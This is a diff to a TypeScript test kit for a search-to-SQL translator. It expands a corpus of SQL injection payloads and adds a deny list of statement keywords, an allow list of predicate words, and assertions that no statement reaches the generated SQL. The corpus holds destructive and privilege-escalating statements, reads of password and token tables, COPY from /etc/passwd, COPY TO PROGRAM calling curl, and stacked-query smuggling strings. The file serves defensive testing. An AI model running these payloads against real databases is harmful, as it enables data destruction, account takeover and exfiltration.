@@ -48,11 +48,12 @@ export interface SearchKitOptions {
  * as text would be a client who can read the database, and a search box is the
  * one place a client types whatever they like.
  *
- * **The destroying statements are the ones worth testing.** A payload that
- * drops a table is short, and it is the shortest thing anybody writes when they
- * are trying to find out whether a search box can be talked into running SQL —
- * so the corpus holds the statements that would do the most damage if they
- * arrived, against the tables this application actually has.
+ * **The corpus holds every command that changes data.** Not the two that are
+ * famous — the whole family, because a filter that blocks `DROP TABLE` and
+ * lets `UPDATE users SET role = 'super_admin'` through has not blocked
+ * anything. A payload that changes a row is short, and it is the shortest
+ * thing anybody writes when they are trying to find out whether a search box
+ * can be talked into running SQL.
  */
 export const INJECTION_CORPUS: readonly string[] = [
   // The classic: a quote that ends the literal and a condition that is always
@@ -62,7 +63,32 @@ export const INJECTION_CORPUS: readonly string[] = [
   "1' OR '1'='1",
   "' UNION SELECT password FROM users --",
 
-  // Dropping a table.
+  // Reading somebody else's data.
+  'SELECT * FROM refresh_tokens;',
+  'SELECT password FROM users;',
+  "COPY (SELECT 1) TO PROGRAM 'curl example.com';",
+
+  // Inserting, updating and deleting.
+  "INSERT INTO users (email, password) VALUES ('a@x.com', 'x');",
+  "UPDATE users SET role = 'super_admin' WHERE email = 'a@x.com';",
+  "UPDATE users SET password = 'x' WHERE id = '1';",
+  "DELETE FROM users WHERE role = 'admin';",
+  'DELETE FROM audit_logs WHERE 1=1;',
+  "MERGE INTO users USING (SELECT 1) s ON true WHEN MATCHED THEN UPDATE SET role = 'super_admin';",
+  "UPSERT INTO users (email) VALUES ('a@x.com');",
+  "COPY users FROM '/etc/passwd';",
+  "COPY users TO PROGRAM 'curl example.com';",
+
+  // Creating and changing the schema.
+  'CREATE TABLE pwned (id int);',
+  'CREATE OR REPLACE FUNCTION pwned() RETURNS trigger AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;',
+  'CREATE INDEX pwned ON users (password);',
+  'ALTER TABLE users ADD COLUMN is_super boolean DEFAULT true;',
+  "ALTER TABLE users ALTER COLUMN role SET DEFAULT 'super_admin';",
+  'ALTER TABLE users RENAME TO users_backup;',
+  'ALTER TABLE users DROP COLUMN password;',
+
+  // Dropping and emptying.
   'DROP TABLE users;',
   'DROP TABLE audit_logs;',
   'DROP TABLE users CASCADE;',
@@ -72,19 +98,50 @@ export const INJECTION_CORPUS: readonly string[] = [
   'DROP TABLE "public"."users";',
   'DROP SCHEMA public CASCADE;',
   'DROP DATABASE boilerplate;',
-  'ALTER TABLE users DROP COLUMN password;',
-  'ALTER TABLE users RENAME TO users_backup;',
   'DROP INDEX IDX_users_email;',
   'DROP TRIGGER users_audit;',
-
-  // Emptying a table.
   'TRUNCATE TABLE users;',
   'TRUNCATE TABLE "users" CASCADE;',
   'TRUNCATE TABLE audit_logs RESTART IDENTITY CASCADE;',
   'TRUNCATE users, audit_logs, refresh_tokens, user_devices;',
   'TRUNCATE refresh_tokens CASCADE;',
-  'DELETE FROM users;',
-  'DELETE FROM audit_logs WHERE 1=1;',
+
+  // Permissions and roles.
+  'GRANT ALL PRIVILEGES ON DATABASE boilerplate TO public;',
+  'REVOKE ALL ON users FROM PUBLIC;',
+  'ALTER ROLE admin SUPERUSER;',
+  'ALTER TABLE users OWNER TO postgres;',
+
+  // Running something.
+  'EXECUTE pwned();',
+  'CALL pwned();',
+  "DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$;",
+  'SELECT pg_sleep(10);',
+
+  // Changing the session or the server.
+  'SET search_path TO public;',
+  'SET ROLE admin;',
+  'RESET ALL;',
+  'VACUUM FULL users;',
+  'REINDEX TABLE users;',
+  'CLUSTER users USING IDX_users_email;',
+  'REFRESH MATERIALIZED VIEW users;',
+  'REASSIGN OWNED BY admin TO postgres;',
+  "COMMENT ON TABLE users IS 'pwned';",
+  "SECURITY LABEL ON TABLE users IS 'pwned';",
+  'CHECKPOINT;',
+  'DISCARD ALL;',
+  'LOCK TABLE users IN ACCESS EXCLUSIVE MODE;',
+
+  // Transactions, prepared statements and the rest.
+  'BEGIN; DROP TABLE users; COMMIT;',
+  'PREPARE p AS SELECT 1; EXECUTE p;',
+  'DEALLOCATE p;',
+  'LISTEN channel;',
+  'UNLISTEN channel;',
+  'NOTIFY channel;',
+  'ANALYZE users;',
+  'SAVEPOINT s; ROLLBACK TO s;',
 
   // The same, smuggled past a filter that expects one value.
   '; DROP TABLE users; --',
@@ -98,6 +155,86 @@ export const INJECTION_CORPUS: readonly string[] = [
   'a_b',
   'back\\slash',
 ];
+
+/**
+ * The commands that are statements.
+ *
+ * **Every one of them changes the database, the server or the permissions —
+ * and a couple of them only read.** A translated fragment that contains one of
+ * these is not a filter any more: it is a statement. A statement that changes a
+ * row is the danger, and a statement that reads somebody else's row is almost
+ * as bad, so the list holds both.
+ *
+ * **It is the list the corpus is built from, and the list the SQL is checked
+ * against.** A translated fragment may contain none of them, ever.
+ */
+export const STATEMENT_COMMANDS: readonly string[] = [
+  'insert',
+  'update',
+  'delete',
+  'merge',
+  'upsert',
+  'copy',
+  'create',
+  'alter',
+  'drop',
+  'truncate',
+  'grant',
+  'revoke',
+  'execute',
+  'call',
+  'do',
+  'set',
+  'reset',
+  'vacuum',
+  'reindex',
+  'cluster',
+  'refresh',
+  'reassign',
+  'comment',
+  'security',
+  'lock',
+  'checkpoint',
+  'discard',
+  'begin',
+  'commit',
+  'rollback',
+  'savepoint',
+  'prepare',
+  'deallocate',
+  'listen',
+  'unlisten',
+  'notify',
+  'analyze',
+  'analyse',
+  'import',
+  'load',
+  'select',
+  'with',
+];
+
+/**
+ * The words a translated fragment is allowed to contain.
+ *
+ * **Everything else is a statement, and a statement changes something.** A
+ * search fragment is a boolean expression over columns and parameters: it is
+ * never a statement, so it cannot insert, update, delete, drop, truncate or
+ * grant. The list is the whole of the vocabulary, and a word outside it means
+ * something reached the SQL that should not have.
+ */
+const ALLOWED_SQL_WORDS: ReadonlySet<string> = new Set([
+  'and',
+  'or',
+  'not',
+  'is',
+  'null',
+  'ilike',
+  'like',
+  'escape',
+  'true',
+  'false',
+  'between',
+]);
 
 /**
  * The errors a translator is allowed to throw.
@@ -123,6 +260,8 @@ export function runSearchTestKit(options: SearchKitOptions): void {
   assertGoldenCases(options);
   assertUnknownFieldsAreRefused(options);
   assertInjectionCorpusNeverReachesTheSql(options);
+  assertNoStatementCanReachTheSql(options);
+  assertTheSqlIsAPredicate(options);
   assertFuzzCorpusStaysInsideTheAllowList(options);
 }
 
@@ -282,6 +421,110 @@ export function assertInjectionCorpusNeverReachesTheSql(
     assertOnlyDeclaredColumns(options, translated);
     assertTheValueWasBound(options, translated, value);
   }
+}
+
+/**
+ * No statement can reach the SQL.
+ *
+ * **Every command in the family, not the two that are famous.** A filter that
+ * blocks `DROP TABLE` and lets `UPDATE users SET role = 'super_admin'` through
+ * has not blocked anything, and the payload that changes a row is just as short
+ * as the one that drops a table.
+ *
+ * The check is on the output: the word must not appear in the SQL at all. It is
+ * a stronger claim than "the value is not in the SQL", because it holds for
+ * every value and not only for the ones somebody thought of.
+ */
+export function assertNoStatementCanReachTheSql(
+  options: SearchKitOptions,
+): void {
+  const field = options.registry.names()[0];
+
+  if (field === undefined) {
+    throw new Error('The registry has no fields, so there is nothing to test.');
+  }
+
+  for (const value of INJECTION_CORPUS) {
+    const translated = translate(
+      'data change',
+      options,
+      `${field}:"${asQueryText(value)}"`,
+    );
+
+    for (const word of sqlWords(translated.sql)) {
+      if (STATEMENT_COMMANDS.includes(word)) {
+        throw new Error(
+          `The command "${word}" reached the SQL. A search fragment is a ` +
+            'boolean expression over columns and parameters — it is never a ' +
+            'statement, and a statement changes something.',
+        );
+      }
+    }
+  }
+}
+
+/**
+ * The SQL is a predicate, and never a statement.
+ *
+ * **The whole of the claim, in one assertion.** A translated fragment may
+ * contain a column name, a parameter, a comparison and a boolean operator, and
+ * nothing else. A word outside that vocabulary is a statement, and a statement
+ * is something that changes the database. A semicolon is the same thing: it is
+ * how a second statement begins.
+ *
+ * This is the structural version of the corpus, and it is the one that holds
+ * for a payload nobody thought of — the corpus proves the payloads we know
+ * about, and this proves there is no shape they could take.
+ */
+export function assertTheSqlIsAPredicate(options: SearchKitOptions): void {
+  const field = options.registry.names()[0];
+
+  if (field === undefined) {
+    throw new Error('The registry has no fields, so there is nothing to test.');
+  }
+
+  for (const value of [...INJECTION_CORPUS, 'value']) {
+    const translated = translate(
+      'predicate',
+      options,
+      `${field}:"${asQueryText(value)}"`,
+    );
+
+    if (translated.sql.includes(';')) {
+      throw new Error(
+        'The SQL contains a semicolon, which is how a second statement ' +
+          'begins. A search fragment is one boolean expression and nothing ' +
+          'follows it.',
+      );
+    }
+
+    for (const word of sqlWords(translated.sql)) {
+      if (!ALLOWED_SQL_WORDS.has(word)) {
+        throw new Error(
+          `The SQL contains the word "${word}", which is not part of the ` +
+            `vocabulary a filter may use: ${[...ALLOWED_SQL_WORDS].join(', ')}. ` +
+            'A word outside it is a statement, and a statement changes ' +
+            'something.',
+        );
+      }
+    }
+  }
+}
+
+/**
+ * The words in a piece of SQL.
+ *
+ * **The quoted identifiers and the parameter names are not words.** A column
+ * name is a name this application wrote, and a parameter is a placeholder;
+ * neither is a word of the statement, and counting them would make the check
+ * about the names rather than about the statement.
+ */
+function sqlWords(sql: string): string[] {
+  const withoutNames = sql.replace(/"[^"]*"/g, ' ').replace(/:\w+/g, ' ');
+
+  return [...withoutNames.matchAll(/[A-Za-z_][A-Za-z0-9_]*/g)].map((match) =>
+    (match[0] ?? '').toLowerCase(),
+  );
 }
 
 /**
